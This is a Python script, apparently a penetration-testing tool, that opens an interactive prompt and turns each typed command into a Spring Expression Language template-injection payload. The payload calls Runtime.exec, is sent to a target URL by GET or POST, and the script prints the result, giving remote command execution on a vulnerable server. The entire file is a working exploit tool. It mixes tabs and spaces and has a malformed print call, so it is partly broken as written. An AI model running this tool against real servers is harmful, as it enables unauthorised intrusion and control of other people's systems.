#!/usr/bin/python3
from cmd import Cmd
import urllib.parse, argparse, requests
from time import gmtime, strftime
from collections import OrderedDict

parser = argparse.ArgumentParser(description="RCE.")
parser.add_argument("-t", "--target",metavar="",required=True,help="Target to give an STI")
parser.add_argument("-u","--url-encode", action="store_true", help="URL Encode")
parser.add_argument("-d","--debug", action="store_true",default=False, help="Print debug")
parser.add_argument("-p","--post-data", metavar="KEY=VALUE", nargs='+', help="Forcing POST request with POST data, the last one will be used for the payload (ex: -p a=b z=d)")

args = parser.parse_args()


url_encode=args.url_encode
target=args.target
DEBUG=args.debug

post_data=args.post_data

def yellow(string):
	return '\033[1;33m%s\033[0m' % string

def debug(x,y):
	if DEBUG:
		print(x+yellow(y))

class Terminal(Cmd):
	start_time=strftime("%H:%M:%S", gmtime())
	prompt=yellow('[%s] ==> ' % start_time)

	def decimal_encode(self,args):

		debug('URL Encoding: ',str(url_encode))

		command=args

		decimals=[]

		for i in command:
			decimals.append(str(ord(i)))

		payload='''${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]


		for i in decimals[1:]:
			line='.concat(T(java.lang.Character).toString({}))'.format(i)
			payload+=line

		payload+=').getInputStream())}'
		if url_encode:
			payload_encoded=urllib.parse.quote_plus(payload,safe='')
			debug('Payload: ',payload_encoded)
			return payload_encoded
		else:
			debug('Payload: ',payload)
			return payload

    # From https://stackoverflow.com/a/52014520
    def parse_var(self,args):
        """
        Parse a key, value pair, separated by '='
        That's the reverse of ShellArgs.

        On the command line (argparse) a declaration will typically look like:
            foo=hello
        or
            foo="hello world"
        """
        items = args.split('=')
        key = items[0].strip() # we remove blanks around keys, as is logical
        if len(items) > 1:
            # rejoin the rest:
            value = '='.join(items[1:])
        return (key, value)

    def parse_vars(self,args):
        """
        Parse a series of key-value pairs and return a dictionary
        """
        d = OrderedDict()

        if args:
            for arg in args:
                key, value = self.parse_var(arg)
                d[key] = value
        return d

	def ssti(self,args):
		start_time=strftime("%H:%M:%S", gmtime())
		base_url=target
		payload=self.decimal_encode(args)

		url=base_url

		headers = {} #This usually has to be added but there is a Burp extension to convert burp headers into python request headers.
		debug('Headers: ',str(headers))
		try:
            # GET case
            if not post_data:
                url += payload
                debug('GET url: ', url)
                response=requests.get(url, headers=headers)
            # POST case
            else:
                data=self.parse_vars(post_data)
                payload_key=list(data.keys())[-1]
                data[payload_key]=payload
                debug('POST url: ', url)
                debug('POST data: ', data)
                response=requests.post(url, headers=headers, data=data)
			output=response.text
			#The next line is used to parse out the output, this might be clean but it also may need work. Depends on the vuln.

			# ssti=str(output).split('&#39;')[1].rstrip()

			print (output)
		except Exception as e:
			print('Unable to send command: %s' % yellow(args))
			print('Qutting at [%s]' % yellow(start_time))
            print('Reason: ' % yellow(e))
			quit()
			#Quit after a command fails just incase the server has been killed.


	def default(self,args):
		self.ssti(args)
		print()
try:
	if DEBUG == True:
		debug('Target: ',target)
	term=Terminal()
	term.cmdloop()
except KeyboardInterrupt:
	print()
	print('Detected CTRL+C, exiting...')
	quit()
